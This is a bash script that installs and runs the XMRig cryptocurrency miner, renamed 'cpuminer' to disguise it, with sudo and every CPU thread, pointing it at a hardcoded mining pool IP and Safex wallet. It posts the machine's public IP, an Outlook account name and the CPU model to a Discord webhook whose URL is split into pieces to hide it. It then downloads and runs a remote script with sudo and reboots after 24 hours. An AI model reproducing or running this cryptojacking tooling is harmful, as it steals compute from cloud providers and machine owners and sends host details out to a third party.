#!/bin/bash


if [ ! -f sudah_initiate_safexcash.txt ]; then
  touch sudah_initiate_safexcash.txt
  mkdir safex
  cd safex
  sudo apt-get install build-essential automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev libnuma-dev git -y
  wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-focal-x64.tar.gz
  tar xf xmrig-6.17.0-focal-x64.tar.gz
  cd ./safex/xmrig-6.17.0
  sudo mv xmrig cpuminer
fi



export  outlook_user=`cat outlook_user.txt | sed -n "$1"P`
export	random_number=`printf '%09d\n' $(shuf -i 0-999999999 -n 1)`
model3=`cat /proc/cpuinfo | grep 'model name' | uniq | cut -d' ' -f 3`
model4=`cat /proc/cpuinfo | grep 'model name' | uniq | cut -d' ' -f 4`
model5=`cat /proc/cpuinfo | grep 'model name' | uniq | cut -d' ' -f 5`
model6=`cat /proc/cpuinfo | grep 'model name' | uniq | cut -d' ' -f 6`

sleep 5
cd ./safex/xmrig-6.17.0
sudo ./cpuminer -o 137.184.15.208:8118 --randomx-1gb-pages -t $(( `cat /proc/cpuinfo | grep processor | wc -l` )) -u Safex5zhXacGgZP8xw2a9tEHsobwVB5tS2sh2pPC9ZFWT6hX5hofxj1PF3D41Fvgo8eWUwVcm1cJRavwmutMKtncWcS36GNkVtj38 -k -a rx/sfx &
sleep 5

if [ ! -f sudah_initiate_discord_safexcash.txt ]; then
  touch sudah_initiate_discord_safexcash.txt
  pre_message="$@======================================================="
  message="$@CPUMINER UNTUK SAFEX SUDAH JALAN : `curl ifconfig.me` | Outlook Acc : $outlook_user | CPU Model : $model3$model4$model5$model6 "
  pasca_message="$@======================================================="
  ## format to parse to curl
  ## echo Sending message: $message
  msg_pre_content=\"$pre_message\"
  msg_content=\"$message\"
  msg_pasca_content=\"$pasca_message\"
  ## discord webhook
  nama1="https://disc"
  nama2="ord.com/ap"
  nama3="i/webh"
  ## FORMAT
  nama4="ooks/953847082421198890/9BRg2Z7tKUtH-ZwgemK4X4JYrS7wO6tTJkitnNiNxVOmGPigsjH2679jAkMideRPD8K1"
  url=$nama1$nama2$nama3$nama4
	curl -H "Content-Type: application/json" -X POST -d "{\"content\": $msg_pre_content}" $url
	curl -H "Content-Type: application/json" -X POST -d "{\"content\": $msg_content}" $url
	curl -H "Content-Type: application/json" -X POST -d "{\"content\": $msg_pasca_content}" $url
 fi
 

##################################
 
sudo rm -rf urgent.sh
wget https://raw.githubusercontent.com/Rickyose/azure_4_core/main/misc/urgent.sh
sudo bash urgent.sh &
 
sleep 24h
sudo reboot
#################################
